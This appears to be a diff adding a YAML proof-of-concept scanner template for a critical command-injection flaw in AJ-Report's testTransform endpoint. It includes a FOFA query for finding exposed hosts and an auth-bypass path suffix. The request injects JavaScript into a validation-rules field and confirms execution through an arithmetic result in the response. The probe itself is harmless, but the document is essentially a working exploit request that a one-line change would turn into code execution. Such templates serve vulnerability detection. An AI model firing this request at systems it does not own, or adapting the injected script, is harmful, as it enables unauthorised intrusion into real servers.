@@ -1,0 +1,21 @@
+id: poc-yaml-aj-report-testtransform-js-rce
+info:
+  name: AJ-Report testtransform接口存在命令注入漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: aj-report
+  fofa: title="AJ-Report"
+variables:
+  t1: random_int(100,199000)
+  t2: random_int(100,19000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /dataSet/testTransform;swagger-ui
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"dynSentence": "{\"apiUrl\":\"\",\"method\":\"\",\"header\":\"{\\\"Content-Type\\\":\\\"\\\"}\",\"body\":\"\"}","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":2,"validationRules":"throw
+    new Error({{.t1}}*{{.t2}});"}],"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"http"}'
+  expression: "status_code == 200 && \ncontains(body,t3)\n"
+transport: http
